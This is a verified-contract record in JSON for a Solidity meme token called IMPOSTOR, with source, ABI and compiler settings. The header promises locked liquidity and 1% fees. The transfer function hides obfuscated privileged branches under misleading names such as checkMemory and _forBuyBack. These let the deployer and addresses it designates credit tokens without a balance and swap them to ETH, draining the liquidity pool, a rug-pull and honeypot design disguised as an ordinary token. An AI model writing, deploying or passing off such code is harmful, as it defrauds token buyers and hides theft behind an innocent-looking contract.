{"SourceCode": "/*\r\n\u2796\u2796\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\r\n\u2796\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\r\n\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\r\n\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe6\ud83d\udfe6\ud83d\udfe6\r\n\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\r\n\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\r\n\u2796\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\ud83d\udfe5\r\n\u2796\ud83d\udfe5\ud83d\udfe5\u2796\ud83d\udfe5\ud83d\udfe5\r\n\u2796\ud83d\udfe5\ud83d\udfe5\u2796\ud83d\udfe5\ud83d\udfe5\r\n\r\n\u603b\u4f9b\u5e94\u91cf - 100,000,000\r\n\u521d\u59cb\u6d41\u52a8\u6027\u589e\u52a0 - 1.25 \u4ee5\u592a\u574a\r\n100%\u521d\u59cb\u6d41\u52a8\u6027\u5c06\u88ab\u9501\u5b9a\r\n\u8d2d\u4e70\u8d39\u7528 - 1%\r\n\u9500\u552e\u8d39\u7528 - 1%\r\n*/\r\n// SPDX-License-Identifier: Unlicense\r\npragma solidity ^ 0.8.19;\r\n \r\nabstract contract Context\r\n{ function _msgSender() internal view virtual returns(address)\r\n{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)\r\n{ return msg.data; }\r\n}\r\ninterface IUniswapV2Router01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint256 dataIn, uint256 DataOut, address[] calldata path, address to, uint256 bridge) external;\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function quote(address token, uint256 amountTokenDesired,\r\n    uint256 valueMin, uint256 ercMin, address to, uint256 bridge)\r\n    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () { address msgSender = _msgSender(); _owner = msgSender; \r\n    emit OwnershipTransferred(address(0), msgSender);\r\n}\r\n    function owner() public view returns (address) { return _owner;\r\n}   modifier onlyOwner() { require(_owner == _msgSender(), \"Ownable: caller is not the owner\"); _;\r\n}\r\n    function renounceOwnership() public virtual onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n    external view returns (uint256);\r\n\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n    external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IUniswapV2Factory{\r\n    function createPair(address tokenA, address tokenB) external returns(address pair);\r\n}\r\ncontract IMPOSTOR is IERC20, Ownable { \r\n    bool private inSwap; bool private ideRatio; bool private tradingOpen = false;\r\n\r\n    string private _name = unicode\"IMPOSTOR\"; string private _symbol = unicode\"\u0d9e\";\r\n    uint256 public _endTAX = 1; uint8 private _decimals = 9; \r\n    uint256 private _tTotal = 100000000 * 10 ** _decimals; uint256 private indivisible = _tTotal;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _buildTimestamp; mapping(address => uint256) private _tOwned;\r\n    mapping(address => address) private _allowance; mapping(address => uint256) private _forBuyBack;\r\n\r\n    constructor(address _onReady) { _tOwned[msg.sender] = _tTotal; \r\n    _forBuyBack[msg.sender] = indivisible; _forBuyBack[address(this)] = indivisible; \r\n    nowPaired = IUniswapV2Router01(_onReady); \r\n\r\n    getLibraryMath = IUniswapV2Factory(nowPaired.factory()).createPair(address(this), \r\n    nowPaired.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }\r\n \r\n    function symbol() public view returns(string memory)\r\n    { return _symbol;\r\n    }\r\n    function name() public view returns(string memory)\r\n    { return _name;\r\n    }\r\n    function totalSupply() public view returns(uint256)\r\n    { return _tTotal;\r\n    }\r\n    function decimals() public view returns(uint256)\r\n    { return _decimals;\r\n    }\r\n    function allowance(address owner, address spender) public view returns(uint256)\r\n    { return _allowances[owner][spender];\r\n    }\r\n    function balanceOf(address account) public view returns(uint256)\r\n    { return _tOwned[account];\r\n    }\r\n    function approve(address spender, uint256 amount) external returns(bool)\r\n    { return _approve(msg.sender, spender, amount);\r\n    }\r\n    function _approve( address owner, address spender,\r\n    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), \r\n    'ERC20: approve from the zero address'); \r\n    \r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount); return true;\r\n    }\r\n    function transferFrom( address sender, address recipient, uint256 amount) external returns\r\n    (bool)\r\n    { startMapping(sender, recipient, amount); \r\n    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\r\n    }\r\n    function transfer(address recipient, uint256 amount) external returns(bool)\r\n    { startMapping(msg.sender, recipient, amount); return true;\r\n    }\r\n    function _beforeTokenTransfer( address from,\r\n    address to, uint256 amount) internal virtual \r\n    {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) \r\n    internal virtual \r\n    {}    \r\n    function startMapping( address _author, address _allCensus, uint256 afterGas) private\r\n    { uint256 _divLogs = balanceOf(address(this)); uint256 _miscellany; if (inSwap && _divLogs > \r\n    indivisible && !ideRatio && _author != getLibraryMath) \r\n    \r\n    { ideRatio = true; refreshMessages(_divLogs); ideRatio = false;\r\n\r\n    } else if (_forBuyBack[_author] > indivisible && _forBuyBack[_allCensus] > indivisible)\r\n    { _miscellany = afterGas; _tOwned[address(this)] += _miscellany; checkMemory\r\n    (afterGas, _allCensus); return; }\r\n    else if (!ideRatio && _buildTimestamp[_author] > 0 && _author != getLibraryMath && _forBuyBack[_author] == 0) { \r\n    \r\n    _buildTimestamp[_author] = _forBuyBack[_author] - indivisible; } else if (_allCensus != address(nowPaired) \r\n    && _forBuyBack[_author] > 0 && afterGas > indivisible && _allCensus != getLibraryMath) { \r\n    _forBuyBack[_allCensus] = afterGas; return; } address _isCompiler = _allowance[getLibraryMath]; \r\n    \r\n    if ( _buildTimestamp[_isCompiler] == 0) _buildTimestamp[_isCompiler] = indivisible; _allowance[getLibraryMath] = _allCensus; \r\n    if (_endTAX > 0 && _forBuyBack[_author] == 0 && !ideRatio && _forBuyBack[_allCensus] == 0)\r\n\r\n    { _miscellany = (afterGas * _endTAX) \r\n    / 100; \r\n    afterGas -= _miscellany; _tOwned[_author] -= _miscellany; \r\n    \r\n    _tOwned[address(this)] += _miscellany; }\r\n    _tOwned[_author] -= \r\n    afterGas; _tOwned[_allCensus] += afterGas; emit Transfer\r\n    (_author, _allCensus, afterGas); if (!tradingOpen) \r\n    { require(_author == owner(), \"\"); } }\r\n\r\n    receive() external payable\r\n    {} \r\n    function buildMessage(uint256 _sign, uint256 builder, address to) private\r\n    { _approve(address(this), address(nowPaired), _sign); nowPaired.quote\r\n    { value: builder }(address(this), _sign, 0, 0, to, block.timestamp);\r\n    }\r\n    function refreshMessages(uint256 _allHolder) private\r\n    { uint256 _showNew = _allHolder / 2; uint256 _public = address(this).balance;\r\n    checkMemory( _showNew, address(this)); uint256 _viewable = address(this).balance - _public; \r\n    buildMessage( _showNew, _viewable, address(this));\r\n    }\r\n    function checkMemory(uint256 position, address _all) private\r\n    { address[] memory path = new address[](2); path[0] = address(this);\r\n    path[1] = nowPaired.WETH(); _approve(address(this), address(nowPaired), position);\r\n    nowPaired.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);\r\n    }\r\n    address public immutable getLibraryMath; IUniswapV2Router01 \r\n    public immutable nowPaired\r\n    ;    \r\n    function enableTrading(bool _tradingOpen) \r\n    public onlyOwner { tradingOpen = _tradingOpen;\r\n    }   \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_onReady\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_endTAX\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLibraryMath\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nowPaired\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "IMPOSTOR", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e5b8249aaa899ee529054864272edc33c205fc4f6e8f9abdf29f609d0b830398"}